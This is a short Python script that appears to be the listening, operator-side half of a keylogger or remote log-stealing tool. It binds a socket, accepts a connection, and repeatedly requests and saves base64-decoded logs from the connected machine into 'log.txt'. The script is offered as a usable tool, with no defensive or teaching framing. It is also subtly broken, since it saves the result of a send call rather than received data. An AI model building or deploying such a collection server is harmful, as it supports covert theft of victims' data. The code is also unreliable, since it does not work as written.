import socket
import base64
import simplejson
import time

class Listen():

    def __init__(self,ip,port):
        my_listener = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        my_listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        my_listener.bind((f"{ip}",port))
        my_listener.listen(0)
        print("listening")
        (self.my_connection,my_address) = my_listener.accept()
        print("connection")
    
    def save_file(self,content):
        with open("log.txt","wb") as file:
            file.write(base64.b64decode(content))

    def json_send(self,data):
        json_data = simplejson.dumps(data).encode("utf-8")
        self.my_connection.send(json_data)	
	
    def json_recv(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.my_connection.recv(1024).decode()
                return simplejson.loads(json_data)
            except ValueError:
                continue
    
    def Save_log(self):
        while True:
            command = '1'
            output = self.json_send(command)
            if command == '1':
                self.save_file(output)
            elif command == '2':
                exit()
            time.sleep(10)
def listen(ip,port):
    a = Listen(f"{ip}",port)
    a.Save_log()
            

                
    
    
    